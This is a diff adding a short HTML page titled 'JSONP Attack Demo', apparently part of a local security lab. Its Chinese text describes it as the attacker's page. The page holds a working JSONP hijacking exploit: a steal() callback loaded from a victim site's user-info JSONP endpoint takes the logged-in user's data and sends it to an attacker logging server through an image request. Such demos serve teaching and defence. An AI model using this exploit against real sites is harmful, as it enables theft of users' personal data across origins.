@@ -1,0 +1,28 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>JSONP Attack Demo</title>
+  <style>
+    body { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; background:#020617; color:#e5e7eb; }
+    pre { background:#020617; border:1px solid #1f2933; border-radius:8px; padding:12px; font-size:12px; max-width:800px; }
+  </style>
+</head>
+<body>
+  <h2>恶意 JSONP 页面（攻击端，非受害者域名）</h2>
+  <p>当你已经在 Victim 站点登录后，再访问这个页面，就会通过 JSONP 跨域读取你的用户信息。</p>
+  <pre id="out">// 等待从 victim 站点拉取 JSONP 数据...</pre>
+
+  <script>
+    function steal(data) {
+      // 1. 先在攻击页面本地展示一份
+      document.getElementById('out').textContent = JSON.stringify(data, null, 2);
+  
+      // 2. 再上报到攻击者服务器（比如 http://localhost:9000/log）
+      var img = new Image();
+      img.src = 'http://localhost:9000/log?d=' + encodeURIComponent(JSON.stringify(data));
+    }
+  </script>
+  <script src="http://127.0.0.1:8081/api/v1/jsonp/userinfo-vuln?callback=steal"></script>
+</body>
+</html>
